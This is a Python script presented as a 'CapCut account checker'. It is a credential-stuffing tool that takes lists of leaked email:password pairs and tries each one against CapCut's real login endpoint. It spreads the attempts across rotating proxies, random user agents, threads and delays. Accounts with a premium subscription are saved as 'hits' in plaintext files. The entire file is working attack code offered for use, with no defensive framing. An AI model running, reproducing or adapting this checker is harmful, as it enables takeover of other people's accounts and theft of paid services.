#@VJF_X
import requests
import json
import time
import random
import sys
import os
from datetime import datetime
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
        CAPCUT ACCOUNT CHECKER v1.0                                         By: @VJF_X                            
"""
PROXIES = [ #ADD PROXY HERE FOR.MASS CHECKING
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

COUNTRY_MAP = {
    "AF": "Afganistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
    "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
    "BO": "Bolivia 🇧🇴", "BA": "Bosnia and Herzegovina 🇧🇦",
    "BR": "Brazil 🇧🇷", "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭",
    "CM": "Cameroon 🇨🇲", "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱",
    "CN": "China 🇨🇳", "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷",
    "HR": "Croatia 🇭🇷", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
    "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴",
    "EC": "Ecuador 🇪🇨", "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻",
    "EE": "Estonia 🇪🇪", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
    "DE": "Germany 🇩🇪", "GR": "Greece 🇬🇷", "GT": "Guatemala 🇬🇹",
    "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
    "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IQ": "Iraq 🇮🇶",
    "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹",
    "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵", "JO": "Jordan 🇯🇴",
    "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪", "KW": "Kuwait 🇰🇼",
    "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧", "LT": "Lithuania 🇱🇹",
    "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MV": "Maldives 🇲🇻",
    "MT": "Malta 🇲🇹", "MX": "Mexico 🇲🇽", "MD": "Moldova 🇲🇩",
    "MN": "Mongolia 🇲🇳", "ME": "Montenegro 🇲🇪", "MA": "Morocco 🇲🇦",
    "MM": "Myanmar 🇲🇲", "NP": "Nepal 🇳🇵", "NL": "Netherlands 🇳🇱",
    "NZ": "New Zealand 🇳🇿", "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴",
    "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰", "PS": "Palestine 🇵🇸",
    "PA": "Panama 🇵🇦", "PY": "Paraguay 🇵🇾", "PE": "Peru 🇵🇪",
    "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
    "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴", "RU": "Russia 🇷🇺",
    "SA": "Saudi Arabia 🇸🇦", "SN": "Senegal 🇸🇳", "RS": "Serbia 🇷🇸",
    "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
    "ZA": "South Africa 🇿🇦", "KR": "South Korea 🇰🇷", "ES": "Spain 🇪🇸",
    "LK": "Sri Lanka 🇱🇰", "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭",
    "TW": "Taiwan 🇹🇼", "TZ": "Tanzania 🇹🇿", "TH": "Thailand 🇹🇭",
    "TN": "Tunisia 🇹🇳", "TR": "Turkey 🇹🇷", "UG": "Uganda 🇺🇬",
    "UA": "Ukraine 🇺🇦", "AE": "UAE 🇦🇪", "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿",
    "VE": "Venezuela 🇻🇪", "VN": "Vietnam 🇻🇳", "ZM": "Zambia 🇿🇲",
    "ZW": "Zimbabwe 🇿🇼",
}

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def get_random_proxy():
    return random.choice(PROXIES)

def get_random_ua():
    return random.choice(USER_AGENTS)

def get_proxy_dict():
    proxy_url = get_random_proxy()
    return {"http": proxy_url, "https": proxy_url}

def print_colored(text, color="white"):
    colors = {
        "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
        "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
        "white": "\033[97m", "reset": "\033[0m"
    }
    print(f"{colors.get(color, '')}{text}{colors['reset']}")

def get_days_left(expiry_date_str):
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
        current_date = datetime.now()
        days_left = (expiry_date - current_date).days
        return days_left
    except:
        return -1

def format_timestamp(timestamp):
    try:
        if timestamp and int(timestamp) > 0:
            return datetime.fromtimestamp(int(timestamp)).strftime("%Y-%m-%d")
    except:
        pass
    return "N/A"

class CapCutChecker:
    def __init__(self, email, password, use_proxy=True):
        self.email = email
        self.password = password
        self.use_proxy = use_proxy
        self.session = requests.Session()
        self.ua = get_random_ua()
        self.csrf_token = ""
        self.cookies = {}
        self.results = {}
        self.user_id = ""
        self.store_country = "us"
        
    def check(self):
        try:
            if not self._check_email():
                return {"status": "fail", "reason": "Email not registered"}            
            if not self._login():
                return {"status": "fail", "reason": "Login failed"}            
            if not self._get_subscription():
                return {"status": "fail", "reason": "Failed to get subscription"}
            
            return {"status": "success", **self.results}
            
        except Exception as e:
            return {"status": "error", "reason": str(e)}
    
    def _check_email(self):
        url = "https://login-row.www.capcut.com/passport/web/user/check_email_registered"
        params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
            "verifyFp": "verify_mhuhsker_tsTN0EMF_rt1O_4r7R_AhXH_mdkghyZu5pZP"
        }
        
        headers = {
            "User-Agent": self.ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        data = f"mix_mode=1&email={quote(self.email)}&fixed_mix_mode=1"
        
        proxies = get_proxy_dict() if self.use_proxy else None
        
        try:
            resp = self.session.post(url, params=params, headers=headers, data=data, 
                                     proxies=proxies, timeout=30, verify=False)
            
            if 'passport_csrf_token' in self.session.cookies:
                self.csrf_token = self.session.cookies['passport_csrf_token']
            
            self.cookies = dict(self.session.cookies)
            
            if '"is_registered":0' in resp.text:
                return False
            elif '"is_registered":1' in resp.text:
                return True
            
            return False
            
        except Exception as e:
            return False
    
    def _login(self):
        url = "https://login-row.www.capcut.com/passport/web/email/login/"
        params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en",
            "verifyFp": "verify_mhuhsker_tsTN0EMF_rt1O_4r7R_AhXH_mdkghyZu5pZP"
        }
        
        headers = {
            "Host": "login-row.www.capcut.com",
            "User-Agent": self.ua,
            "Accept": "application/json, text/javascript",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Tt-Passport-Csrf-Token": self.csrf_token,
            "Appid": "348188",
            "Did": "7571429326408795703",
            "Store-Country-Code": "ph",
            "Store-Country-Code-Src": "uid",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        data = f"mix_mode=1&email={quote(self.email)}&password={quote(self.password)}&check_region=1&fixed_mix_mode=1"
        
        proxies = get_proxy_dict() if self.use_proxy else None
        
        try:
            resp = self.session.post(url, params=params, headers=headers, data=data,
                                     proxies=proxies, timeout=30, verify=False)
            if 'Maximum number of attempts' in resp.text:
                return False
            
            if '"message":"success"' in resp.text:
                self.cookies = dict(self.session.cookies)
                try:
                    resp_json = resp.json()
                    if 'data' in resp_json and 'user_id' in resp_json['data']:
                        self.user_id = resp_json['data']['user_id']
                except:
                    pass
                if 'store-country-code' in self.cookies:
                    self.store_country = self.cookies['store-country-code']
                
                return True
            
            return False
            
        except Exception as e:
            return False
    
    def _get_subscription(self):
        url = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"
        
        headers = {
            "Host": "commerce-api-sg.capcut.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Appid": "348188",
            "Loc": "US",
            "Lan": "en",
            "Pf": "7",
            "Appvr": "12.4.0",
            "Tdid": "",
            "Sign-Ver": "1",
            "App-Sdk-Version": "48.0.0",
            "Sign": "4a43f171f9065d62934653040e42f3be",
            "Device-Time": str(int(time.time())),
            "Did": "7546955250902976017",
            "Store-Country-Code": self.store_country,
            "Store-Country-Code-Src": "uid",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/",
            "Content-Type": "application/json"
        }
        cookie_string = ""
        for key, value in self.cookies.items():
            cookie_string += f"{key}={value}; "
        if cookie_string:
            headers["Cookie"] = cookie_string
        
        data = '{"aid":"348188","scene":"vip"}'
        
        proxies = get_proxy_dict() if self.use_proxy else None
        
        try:
            resp = self.session.post(url, headers=headers, data=data,
                                     proxies=proxies, timeout=30, verify=False)
            
            if resp.status_code == 200:
                try:
                    resp_json = resp.json()
                    
                    if resp_json.get('ret') == '0':
                        data = resp_json.get('data', {})
                        
                        vip_levels = data.get('vip_levels', [])
                        
                        if vip_levels:
                            plan = vip_levels[0].get('level', 'free').upper()
                        else:
                            response_data = resp_json.get('response', {})
                            if isinstance(response_data, str):
                                try:
                                    response_data = json.loads(response_data)
                                except:
                                    response_data = {}
                            
                            if response_data and response_data.get('flag'):
                                plan = response_data.get('level', 'VIP').upper()
                            else:
                                plan = 'FREE'
                        
                        self.results['plan'] = plan
                        cycle = data.get('cycle_unit', 'N/A')
                        self.results['billing_cycle'] = cycle
                        
                        end_time = data.get('end_time', 0)
                        if end_time == 0:
                            if response_data and response_data.get('end_time'):
                                end_time = response_data.get('end_time', 0)
                        
                        if end_time == 0:
                            self.results['expiry'] = 'No Expiry (Free)'
                            self.results['days_left'] = 'N/A'
                        else:
                            expiry_date = format_timestamp(end_time)
                            self.results['expiry'] = expiry_date
                            self.results['days_left'] = get_days_left(expiry_date)
                        subscribe_type = data.get('subscribe_type', 'N/A')
                        self.results['renewal'] = subscribe_type.upper()
                        country_code = self.cookies.get('store-country-code', 'US').upper()
                        self.results['region'] = country_code
                        self.results['country'] = COUNTRY_MAP.get(country_code, country_code)
                        
                        return True
                    else:
                        return False
                        
                except json.JSONDecodeError:
                    return False
                except Exception:
                    return False
            
            return False
            
        except Exception as e:
            return False

def check_account(account, use_proxy_bool, stats, hit_file, free_file, lock):
    try:
        email, password = account.split(':', 1)
    except:
        with lock:
            stats['errors'] += 1
            print_colored(f"Error : Invalid format: {account}", "red")
        return
    time.sleep(random.uniform(0.5, 1.5))
    
    checker = CapCutChecker(email, password, use_proxy=use_proxy_bool)
    result = checker.check()
    
    with lock:
        if result['status'] == 'success':
            plan = result.get('plan', 'FREE')
            days_left = result.get('days_left', 'N/A')

            if plan != 'FREE' and days_left != 'N/A' and (isinstance(days_left, int) and days_left > 0):
                stats['hits'] += 1
                with open(hit_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | Plan: {plan} | Expiry: {result.get('expiry')} | Days: {days_left} | Country: {result.get('country')} | Renewal: {result.get('renewal')}\n")
                print_colored("\nGot Hit", "green")
                print_colored(f"Email : {email}", "white")
                print_colored(f"Pass : {password}", "white")
                print(f"Region       : {result.get('region', 'Unknown')}")
                print(f"Country      : {result.get('country', 'Unknown')}")
                print(f"Plan         : {plan}")
                print(f"Expiry       : {result.get('expiry', 'N/A')}")
                print(f"Days Left    : {days_left}")
                print(f"Renewal      : {result.get('renewal', 'N/A')}")
                print()
            else:
                stats['free'] += 1
                with open(free_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | Country: {result.get('country', 'Unknown')}\n")
                print_colored("\nGot Free", "blue")
                print_colored(f"Email : {email}", "white")
                print_colored(f"Pass : {password}", "white")
                print(f"Region       : {result.get('region', 'Unknown')}")
                print(f"Country      : {result.get('country', 'Unknown')}")
                print(f"Plan         : FREE")
                print()
        else:
            stats['bad'] += 1
            reason = result.get('reason', 'Unknown')
            print_colored(f"Email : {email}", "red")
            print_colored(f"Response : {reason}", "red")
            print()

def main():
    clear_screen()
    print(BANNER)
    print()
    print_colored("Select checking mode:", "cyan")
    print("  1. Single account check")
    print("  2. Bulk check from TXT file")
    print()
    
    while True:
        mode = input("  Enter choice (1 or 2): ").strip()
        if mode == "1" or mode == "2":
            break
        print_colored("Invalid choice! Please enter 1 or 2.", "red")
    
    accounts = []
    
    if mode == "1":
        print_colored("\nEnter account details:", "cyan")
        email = input("  Email: ").strip()
        password = input("  Password: ").strip()
        if email and password:
            accounts.append(f"{email}:{password}")
        else:
            print_colored("Invalid email or password!", "red")
            sys.exit(0)
    else:
        print_colored("\nEnter path to TXT file (each line: email:password):", "cyan")
        filepath = input("  File path: ").strip()
        
        if not os.path.exists(filepath):
            print_colored(f"File not found: {filepath}", "red")
            sys.exit(0)
        
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    accounts.append(line)
        
        if not accounts:
            print_colored("No valid accounts found in file!", "red")
            sys.exit(0)
    print()
    print_colored("Do you want to use proxies?", "cyan")
    use_proxy = input("  Use proxies? (y/n): ").strip().lower()
    use_proxy_bool = use_proxy == 'y'
    
    if use_proxy_bool:
        print_colored(f"\nUsing {len(PROXIES)} hardcoded proxies", "green")
    else:
        print_colored("\nProxies disabled. Using direct connection.", "yellow")
    
    print()
    print_colored(f"Checking {len(accounts)} account(s) with 3 threads...", "cyan")
    print()
    stats = {
        'hits': 0,
        'free': 0,
        'bad': 0,
        'errors': 0
    }
    output_dir = "capcut_output"
    os.makedirs(output_dir, exist_ok=True)
    
    hit_file = os.path.join(output_dir, "hits.txt")
    free_file = os.path.join(output_dir, "free.txt")
    lock = threading.Lock()
    
    print_colored("Checking Accounts", "cyan")
    print_colored(f"Total : {len(accounts)}", "white")
    print()
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for account in accounts:
            future = executor.submit(
                check_account, 
                account, 
                use_proxy_bool, 
                stats, 
                hit_file, 
                free_file, 
                lock
            )
            futures.append(future)
            time.sleep(0.3)
        for future in as_completed(futures):
            pass
    print()
    print_colored("FINAL SUMMARY", "cyan")
    print_colored(f"Total Checked : {len(accounts)}", "white")
    print_colored(f"Hits (Premium): {stats['hits']}", "green")
    print_colored(f"Free          : {stats['free']}", "blue")
    print_colored(f"Bad           : {stats['bad']}", "red")
    print_colored(f"Errors        : {stats['errors']}", "yellow")
    print_colored(f"Output saved to: {output_dir}/", "white")
    print()
    print_colored("🔥 @VJF_X 🔥", "magenta")
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nStopped by user.")
        sys.exit(0)
#@VJF_X        
